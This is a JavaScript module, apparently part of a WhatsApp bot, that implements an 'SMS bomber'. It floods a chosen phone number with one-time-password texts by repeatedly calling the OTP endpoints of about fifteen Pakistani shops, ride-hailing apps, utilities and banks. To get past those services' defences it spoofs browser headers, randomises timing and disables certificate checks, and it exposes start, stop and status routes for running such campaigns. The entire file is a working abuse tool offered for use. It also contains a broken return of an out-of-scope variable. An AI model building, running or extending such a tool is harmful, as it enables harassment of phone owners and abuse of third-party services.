// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number>
// SMS bombing using Pakistan-specific OTP API endpoints
// Randomly cycles through telecom/bank/service APIs per attempt
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const https = require('https');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_MINUTES = 1;
const REQUEST_DELAY_MIN_MS = 50;
const REQUEST_DELAY_MAX_MS = 150;
const API_TIMEOUT_MS = 1500;      // Per-API timeout — if exceeded, move to next API immediately
const MAX_APIS_PER_ATTEMPT = 2;   // Max APIs to try per attempt (speed vs coverage balance)

// ---------- PAKISTAN SMS OTP APIS ----------
// Endpoints used by Pakistani services to trigger OTPs.
// These hit the actual login/register APIs — some are POST, some GET with params.
// Cloudflare/WAF may block some; the bomber skips 403/404 and tries the next.
const SMS_APIS = [
  {
    // Daraz PK — password reset / login OTP
    name: 'Daraz',
    url: 'https://api.daraz.pk/rest/auth/sendOtp',
    method: 'POST',
    payload: (number) => ({ mobile: number, countryCode: 'PK' }),
    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36' }
  },
  {
    // Daraz alternative endpoint
    name: 'Daraz2',
    url: 'https://auth.daraz.pk/send-otp',
    method: 'POST',
    payload: (number) => ({ phoneCode: '92', phoneNo: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // FoodPanda PK — login OTP
    name: 'FoodPanda',
    url: 'https://pk.api.foodpanda.com/v3/auth/send-otp',
    method: 'POST',
    payload: (number) => ({ phone_number: '92' + number, country_code: 'PK' }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // AirLift — ride-hailing OTP
    name: 'AirLift',
    url: 'https://api.airlift.pk/v1/auth/otp',
    method: 'POST',
    payload: (number) => ({ phone: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Talabat PK — food delivery OTP
    name: 'Talabat',
    url: 'https://pk.api.talabat.com/api/v1/auth/send-otp',
    method: 'POST',
    payload: (number) => ({ phoneNumber: '92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Bykea — ride-hailing OTP
    name: 'Bykea',
    url: 'https://api.bykea.com/v3/auth/send-otp',
    method: 'POST',
    payload: (number) => ({ phone: number, countryCode: '+92' }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // LESCO — bill inquiry SMS
    name: 'LESCO',
    url: 'https://www.lesco.gov.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ mobileNo: '0' + number, consumerNo: '999999' }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // K-Electric — bill inquiry SMS
    name: 'KElectric',
    url: 'https://www.ke.com.pk/customers/otp',
    method: 'POST',
    payload: (number) => ({ phone: number, refNo: '99999999999' }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // UBL Digital — banking OTP
    name: 'UBL',
    url: 'https://www.ubldigital.com/otp/generate',
    method: 'POST',
    payload: (number) => ({ mobileNumber: '92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // HBL Konnect — banking OTP
    name: 'HBL',
    url: 'https://www.hblkonnect.com/otp/request',
    method: 'POST',
    payload: (number) => ({ phoneNumber: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Meezan Bank — account OTP
    name: 'Meezan',
    url: 'https://www.meezanbank.com/otp',
    method: 'POST',
    payload: (number) => ({ mobile: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Zameen.com — property portal OTP
    name: 'Zameen',
    url: 'https://www.zameen.com/api/send-otp',
    method: 'POST',
    payload: (number) => ({ phone: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // OLX PK — login OTP
    name: 'OLX',
    url: 'https://www.olx.com.pk/api/send-otp',
    method: 'POST',
    payload: (number) => ({ phone: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Careem PK — ride-hailing OTP
    name: 'Careem',
    url: 'https://pk.api.careem.com/v1/auth/otp/send',
    method: 'POST',
    payload: (number) => ({ phoneNumber: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Yayvo — ecommerce OTP
    name: 'Yayvo',
    url: 'https://yayvo.com/api/v1/auth/send-otp',
    method: 'POST',
    payload: (number) => ({ mobileNumber: number }),
    headers: { 'Content-Type': 'application/json' }
  }
];

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
    super();
    this.phone = phoneNumber.replace(/\D/g, '');
    this.durationMs = durationMinutes * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- SINGLE API CALL (raw https, no axios dep needed) ----------
  _callApi(apiConfig) {
    return new Promise((resolve) => {
      try {
        const url = new URL(apiConfig.url);
        const isPost = apiConfig.method === 'POST';
        const bodyStr = isPost ? JSON.stringify(apiConfig.payload(this.phone)) : '';
        const headers = {
          ...(apiConfig.headers || {}),
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9,ur;q=0.8',
          'Origin': url.origin,
          'Referer': url.origin + '/',
          ...(isPost ? { 'Content-Length': Buffer.byteLength(bodyStr) } : {})
        };

        const options = {
          hostname: url.hostname,
          port: 443,
          path: url.pathname + url.search,
          method: apiConfig.method,
          headers,
          timeout: API_TIMEOUT_MS,
          rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            // Only count ACTUAL success (2xx). 403=Cloudflare rejecting, 404=wrong path, etc.
            const success = res.statusCode >= 200 && res.statusCode < 300;
            resolve({ api: apiConfig.name, status: res.statusCode, success, body: data.slice(0, 100) });
          });
        });
        req.on('error', () => resolve({ api: apiConfig.name, status: 0, success: false, body: 'connection error' }));
        req.on('timeout', () => { req.destroy(); resolve({ api: apiConfig.name, status: 0, success: false, body: 'timeout' }); });
        if (bodyStr) req.write(bodyStr);
        req.end();
      } catch (e) {
        resolve({ api: apiConfig.name, status: 0, success: false, body: e.message });
      }
    });
  }

  // ---------- FULL ATTEMPT — tries up to MAX_APIS_PER_ATTEMPT APIs ----------
  // If one times out or fails, immediately starts the next — no waiting.
  async _sendSms() {
    const shuffled = [...SMS_APIS].sort(() => Math.random() - 0.5);
    const toTry = shuffled.slice(0, MAX_APIS_PER_ATTEMPT);

    for (const api of toTry) {
      const result = await this._callApi(api);
      if (result.success) {
        // Got a response (any 2xx-4xx) — count it and move on
        return result;
      }
      // Timeout / connection error — immediately try next API (no extra delay)
    }

    // All tried APIs failed — return the last result (no extra call, already have it)
    return result;
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });
    let lastLogTime = 0;

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        this.stats.attempts++;
        const result = await this._sendSms();

        if (result.success) {
          this.stats.success++;
        } else {
          this.stats.errors++;
        }

        // Log first 10 results + every 20th after that
        const now = Date.now();
        if (this.stats.attempts <= 10 || (now - lastLogTime > 30000)) {
          console.log(`[SMSBomber] #${this.stats.attempts} ${result.api} → ${result.status}`);
          lastLogTime = now;
        }
      } catch (err) {
        this.stats.errors++;
      }

      if (this.stats.attempts % 10 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      await this._sleep(this._randomDelay());
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
  }
  const campaign = new SmsBomber(phoneNumber);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationMinutes: DEFAULT_DURATION_MINUTES });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
